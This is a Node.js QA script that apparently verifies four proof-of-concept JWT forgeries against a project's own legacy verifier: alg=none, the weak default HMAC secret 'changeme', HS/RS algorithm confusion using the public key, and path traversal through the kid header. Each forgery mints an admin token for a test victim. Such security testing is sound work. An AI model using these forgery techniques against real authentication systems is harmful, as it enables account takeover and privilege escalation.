// Scratch script used during Gate 3 to verify each Phase-1 PoC works
// against the actual v1 verifier code. Run with:
//
//   pnpm tsx docs/phases/phase-1/poc-scratch.mjs
//
// This file is part of QA artifacts; the PoCs themselves are
// reproduced in adversarial-qa.md.

import {
  createHmac,
  createSign,
  createPublicKey,
  randomBytes,
} from "node:crypto";
import { mkdirSync, writeFileSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

import { verifyAccessTokenV1 } from "../../../packages/shared/src/jwt-v1.ts";
import {
  LEGACY_KID,
  LEGACY_RSA_PUBLIC_PEM,
  LEGACY_RSA_PRIVATE_PEM,
} from "../../../packages/shared/src/legacy-keys.ts";

function b64u(buf) {
  return Buffer.from(buf)
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

function makeToken(header, payload, signature) {
  const h = b64u(JSON.stringify(header));
  const p = b64u(JSON.stringify(payload));
  const s = signature ? b64u(signature) : "";
  return `${h}.${p}.${s}`;
}

// Stage a fake keys/ directory mirroring apps/web/keys so the v1
// verifier's loadKidKey() resolves files relative to cwd.
const stage = (() => {
  const dir = join(tmpdir(), `bvbe-poc-${randomBytes(4).toString("hex")}`);
  mkdirSync(join(dir, "keys"), { recursive: true });
  writeFileSync(join(dir, "keys", LEGACY_KID), LEGACY_RSA_PUBLIC_PEM);
  // Also stage a known target file under cwd so V-20 demo works.
  writeFileSync(join(dir, "secret-file.txt"), "PUBLIC-LAB-MARKER-FILE\n");
  return dir;
})();
process.chdir(stage);
console.log("[poc] staged cwd:", stage);

const NOW = Math.floor(Date.now() / 1000);
const PAYLOAD = {
  iss: "bvbe",
  aud: "bvbe-mobile",
  sub: "u-victim",
  exp: NOW + 600,
  iat: NOW,
  email: "victim@example.test",
  role: "admin",
  kycTier: 3,
};

// ---- V-8: alg=none ----
{
  const token = makeToken({ alg: "none", typ: "JWT" }, PAYLOAD, null);
  const claims = verifyAccessTokenV1(token, "any-secret");
  console.log("[V-8 alg=none] verified as:", claims.email, claims.role);
}

// ---- V-9: weak HMAC default "changeme" with no kid ----
{
  const h = b64u(JSON.stringify({ alg: "HS256", typ: "JWT" }));
  const p = b64u(JSON.stringify(PAYLOAD));
  const sig = createHmac("sha256", "changeme").update(`${h}.${p}`).digest();
  const token = `${h}.${p}.${b64u(sig)}`;
  const claims = verifyAccessTokenV1(token, "changeme");
  console.log("[V-9 weak-default] verified as:", claims.email, claims.role);
}

// ---- V-19: HS/RS confusion ----
{
  // Attacker fetches the PEM via /api/.well-known/jwks.json (here we
  // read the same content directly).
  const pemBytes = LEGACY_RSA_PUBLIC_PEM;
  const h = b64u(JSON.stringify({ alg: "HS256", typ: "JWT", kid: LEGACY_KID }));
  const p = b64u(JSON.stringify(PAYLOAD));
  // HMAC with the PEM string as the secret — the verifier will load
  // the kid file (same bytes) and use as HMAC secret.
  const sig = createHmac("sha256", pemBytes).update(`${h}.${p}`).digest();
  const token = `${h}.${p}.${b64u(sig)}`;
  const claims = verifyAccessTokenV1(token, "any-secret");
  console.log(
    "[V-19 HS/RS confusion] verified as:",
    claims.email,
    claims.role,
  );
}

// ---- V-20: kid path traversal ----
{
  const targetPath = "../secret-file.txt"; // resolved from cwd/keys/<kid>
  const fileBytes = readFileSync(join(stage, "secret-file.txt"));
  const h = b64u(
    JSON.stringify({ alg: "HS256", typ: "JWT", kid: targetPath }),
  );
  const p = b64u(JSON.stringify(PAYLOAD));
  const sig = createHmac("sha256", fileBytes).update(`${h}.${p}`).digest();
  const token = `${h}.${p}.${b64u(sig)}`;
  const claims = verifyAccessTokenV1(token, "any-secret");
  console.log(
    "[V-20 kid traversal] verified as:",
    claims.email,
    claims.role,
    "via file:",
    targetPath,
  );
}

// ---- Sanity: a legitimately-signed RS256 token still works ----
{
  const h = b64u(JSON.stringify({ alg: "RS256", typ: "JWT", kid: LEGACY_KID }));
  const p = b64u(JSON.stringify(PAYLOAD));
  const sig = createSign("RSA-SHA256")
    .update(`${h}.${p}`)
    .sign(LEGACY_RSA_PRIVATE_PEM);
  const token = `${h}.${p}.${b64u(sig)}`;
  const claims = verifyAccessTokenV1(token, "any-secret");
  console.log(
    "[legit RS256] verified as:",
    claims.email,
    "(sanity — not a vuln)",
  );
}

console.log("[poc] all four signature-class PoCs verified.");
